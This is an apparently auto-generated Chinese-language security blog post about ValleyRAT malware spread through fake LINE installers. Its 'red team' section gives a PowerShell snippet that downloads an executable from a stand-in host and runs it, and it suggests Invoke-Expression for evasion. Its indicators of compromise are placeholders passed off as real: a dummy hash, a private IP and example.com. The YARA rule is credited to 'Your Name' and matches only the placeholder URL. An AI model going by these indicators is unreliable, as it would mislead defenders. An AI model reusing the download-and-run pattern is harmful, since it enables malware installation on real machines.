---
layout: post
title:  "【資安日報】2月6日，中國駭客假借提供LINE安裝程式散布惡意軟體ValleyRAT"
date:   2026-02-06 12:44:00 +0000
categories: [security]
severity: high
---

# 🔥 解析 ValleyRAT 惡意軟體的技術細節與防禦策略
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: 高 (CVSS 分數：8.3)
> * **受駭指標**: 遠端程式碼執行 (RCE) 與憑證竊取
> * **關鍵技術**: PowerShell 指令碼、XML 工作排程設定檔、Silver Fox APT 組織

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ValleyRAT 惡意軟體利用假冒 LINE 安裝程式，透過 PowerShell 指令碼和 XML 工作排程設定檔，建立受害電腦與位於香港的伺服器連線，進而竊取憑證。
* **攻擊流程圖解**: 
    1. 使用者下載假冒 LINE 安裝程式
    2. 執行假冒安裝程式，啟動 PowerShell 指令碼
    3. PowerShell 指令碼建立 XML 工作排程設定檔
    4. XML 工作排程設定檔觸發遠端程式碼執行
    5. 遠端程式碼執行下載 ValleyRAT 惡意軟體
    6. ValleyRAT 惡意軟體竊取憑證
* **受影響元件**: Windows 作業系統、LINE 安裝程式

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 受害者需要下載假冒 LINE 安裝程式
* **Payload 建構邏輯**:

    ```
    
    powershell
        # PowerShell 指令碼範例
        $url = "https://example.com/valleyrat.exe"
        $output = "C:\Windows\Temp\valleyrat.exe"
        Invoke-WebRequest -Uri $url -OutFile $output
        Start-Process -FilePath $output
    
    ```
* **繞過技術**: 可以使用 PowerShell 的隱藏功能，例如使用 `Invoke-Expression` 或 `Invoke-Command` 來執行遠端程式碼

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\valleyrat.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
        rule ValleyRAT {
            meta:
                description = "ValleyRAT 惡意軟體"
                author = "Your Name"
            strings:
                $a = "https://example.com/valleyrat.exe"
            condition:
                $a
        }
    
    ```
* **緩解措施**: 更新 LINE 安裝程式，使用正確的安裝程式下載連結，避免下載假冒安裝程式

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **PowerShell**: 一種由 Microsoft 開發的任務自動化和配置管理框架
* **XML 工作排程設定檔**: 一種使用 XML 格式的工作排程設定檔，用于定義工作排程的設定和行為
* **Silver Fox APT 組織**: 一種中國的 APT 組織，用于進行網路間諜活動

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/173824)
- [MITRE ATT&CK](https://attack.mitre.org/)


